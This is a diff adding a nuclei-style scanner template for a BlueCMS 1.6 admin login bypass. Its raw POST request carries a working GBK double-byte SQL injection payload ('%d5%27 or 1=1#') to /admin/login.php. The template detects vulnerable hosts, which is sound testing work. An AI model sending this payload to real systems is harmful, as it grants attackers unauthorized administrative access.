@@ -1,0 +1,31 @@
+id: wooyun-2010-021082
+info:
+  name: bluecms_1.6_双字节万能密码进后台
+  author:
+  - jim2g
+  description: |
+    bluecms_1.6_双字节万能密码进后台
+    逻辑漏洞是指攻击者利用业务/功能上的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改，确权访问，密码找回，交易支付金额等功能处。
+    逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或者代码问题或固有不足，操作上并不影响程序的允许，在逻辑上是顺利执行的。
+    这种漏洞一般防护手段或设备无法阻止，因为走的是合法流量也没有防御标准。
+  severity: high
+  remediation: |
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+
+    临时修复方案：
+    根据漏洞具体详细进行漏洞修复方案描写
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - contains(body,'setTimeout(\"location.replace(\'index.php\')\",\'2000\')')
+  raw:
+  - |
+    POST /admin/login.php HTTP/1.1
+    Host: {{Hostname}}
+
+    admin_name=hentai%d5%27%20or%201%3d1%23&admin_pwd=hentai&submit=%B5%C7%C2%BC&act=do_login
+  req-condition: true
